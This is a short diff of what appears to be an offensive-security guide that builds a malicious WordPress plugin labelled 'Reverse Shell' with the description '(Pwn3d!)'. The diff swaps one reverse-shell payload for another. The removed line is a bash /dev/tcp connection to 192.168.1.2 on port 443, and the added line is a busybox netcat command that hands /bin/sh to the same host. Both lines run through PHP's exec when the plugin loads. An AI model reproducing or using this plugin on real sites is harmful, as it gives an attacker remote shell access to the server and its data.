@@ -451,16 +451,17 @@ nano plugin.php
 ```php
 <?php
   /**
-  * Plugin Name: Reverse Shell
-  * Plugin URI: http://wordpress.org
+  * Plugin Name: WordPress (Reverse Shell)
+  * Plugin URI: https://wordpress.org
   * Description: (Pwn3d!)
   * Version: 1.0
   * Author: d4t4s3c
   * Author URI: https://github.com/d4t4s3c
   */
 
-  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
-  ?>
+  exec("busybox nc 192.168.1.2 443 -e /bin/sh");
+
+?>
 ```
 
 <kbd>Compress</kbd>
